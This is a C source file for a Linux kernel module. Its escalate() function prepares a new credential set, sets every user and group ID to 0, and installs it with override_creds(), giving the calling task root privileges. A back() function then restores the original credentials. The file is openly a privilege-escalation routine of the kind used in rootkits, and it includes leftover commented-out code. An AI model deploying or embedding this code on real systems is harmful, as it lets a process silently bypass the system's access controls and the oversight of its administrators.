#include <linux/module.h>
#include <linux/kernel.h>
#include<linux/sched.h>
#include<linux/cred.h>
#include<linux/slab.h>
#include "privilege_escalation.h"

const static struct cred * current_cred = NULL;
static struct cred * new_cred;

void escalate(){
  if(current->cred->uid==0){
    printk(KERN_INFO "You are already root\n");
    return;
  }
  //printk(KERN_INFO "current uid %d\n", current->cred->uid);
  //rcu_read_lock();
  //do {
    // current_cred = current->real_cred;
  //} while (!atomic_inc_not_zero(&((struct cred *)current_cred)->usage));
  //if(current_cred){
  //  printk(KERN_INFO "current uid %d\n", current_cred->suid);
  //}
  //rcu_read_unlock();
  new_cred = prepare_creds();
  if (!new_cred){
    printk(KERN_INFO "Prepare new task credential failed!\n");
    return;
  }
  new_cred->suid = 0;
  new_cred->sgid = 0;
  new_cred->uid = 0;
  new_cred->gid = 0;
  new_cred->euid = 0;
  new_cred->egid = 0;
  new_cred->fsuid = 0;
  new_cred->fsgid = 0;

  current_cred = override_creds(new_cred);
  printk(KERN_INFO "new uid %d\n", current->cred->uid);
} 

void back(void){
 if(new_cred){
    //abort_creds(new_cred);
    revert_creds(current_cred);
    put_cred(new_cred);
    printk(KERN_INFO "new uid %d\n", current->cred->uid);
    current_cred = NULL;
   // kfree(new_cred);
    new_cred = NULL;
  }
}
